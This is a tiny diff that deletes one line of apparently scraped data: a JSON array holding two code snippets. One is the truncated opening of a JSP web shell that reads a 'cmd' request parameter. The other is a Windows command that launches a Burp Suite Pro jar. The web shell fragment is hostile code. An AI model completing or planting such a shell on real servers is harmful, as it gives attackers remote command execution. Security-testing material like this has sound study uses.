@@ -1,1 +1,0 @@
-["```\n<%@ page import=\"java.util.*,java.io.*\"%>\n  <%\n  if (request.getParameter(\"cmd\") != null) {\n       out.println(\"Webshell cmd: \" + request.getParameter(\"cmd\")\n```", "```\nC:\\Burp Jar Files>java -jar\nburpsuite_pro_v2023.4.3.jar\n```"]
